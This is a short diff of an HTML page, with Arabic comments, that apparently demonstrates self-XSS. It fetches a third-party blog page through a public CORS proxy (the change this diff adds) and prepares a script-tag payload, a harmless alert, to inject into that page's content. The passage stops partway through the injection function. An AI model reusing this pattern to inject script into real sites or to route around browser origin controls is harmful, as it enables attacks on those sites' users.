@@ -6,15 +6,16 @@
 </head>
 <body>
     <script>
-        // URL الموقع الخارجي الذي تريد تحويل الزائر إليه
+        // URL الموقع الخارجي الذي تريد تحويل الزائر إليه عبر بروكسي CORS
         var targetUrl = 'https://www.hackerone.com/hackerone-community-blog/hack-hard-have-fun-increase-security';
+        var proxyUrl = 'https://cors-anywhere.herokuapp.com/' + targetUrl;
 
         // الكود الذي سيتم حقنه في الصفحة الهدف
         var payload = '<script>alert("This site is vulnerable to self-XSS!");<\/script>';
 
         // دالة لتحويل الزائر وإضافة الكود
         function redirectAndInject() {
-            fetch(targetUrl)
+            fetch(proxyUrl)
                 .then(response => response.text())
                 .then(data => {
                     // حقن الكود في محتوى الصفحة الهدف
